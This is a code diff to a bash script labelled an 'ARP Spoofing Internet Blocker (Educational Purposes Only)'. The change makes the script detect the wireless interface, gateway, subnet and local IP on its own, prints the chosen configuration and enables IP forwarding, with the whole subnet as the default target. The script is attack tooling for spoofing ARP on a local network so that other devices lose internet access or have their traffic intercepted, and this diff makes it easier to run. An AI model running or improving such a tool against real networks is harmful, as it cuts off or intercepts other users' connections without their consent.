@@ -3,19 +3,38 @@
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
 # Requires: arpspoof, iptables, ipcalc, and root privileges
 
-echo "Enter Router Gateway IP:"
-read -p "> " GATEWAY
-echo "Enter Target IP(s) or (space-separated) Multi IP's or Subnet (10.0.0.1/20):"
-read -p "> " TARGET_IPS
+# Detect Interface
+WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
+echo "Enter Wireless Interface: Enter by default"
+read -p "> $WLAN " WLN
+INTERFACE="${WLN:-$WLAN}"
+
+# Detect Gateway IP
+GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
+echo "Enter Router Gateway IP: Enter by default"
+read -p "> $GW" INET
+GATEWAY="${INET:-$GW}"
+
+# Detect Subnet
+MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
+echo "Enter Subnet mask: Enter by default"
+read -p "> $MASK" IPS
+TARGET_IPS="${IPS:-$MASK}"
 
 # Detect Device IP
-echo "Enter Device IP: Enter to skip"
+echo "Enter Device IP: Enter by default"
 IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
 read -p "> $IP" DEVIP
 MYIP="${DEVIP:-$IP}"
 
-echo "Enter Wifi Interface (wlan0):"
-read -p "> " INTERFACE
+echo ""
+# Prompt configuration
+echo "Your Arpspoof Configurations..."
+echo ""
+echo "INTERFACE: | $INTERFACE"
+echo "GATEWAY:   | $GATEWAY"
+echo "MYIP:      | $MYIP"
+echo "TARGETS:   | $TARGET_IPS"
 
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
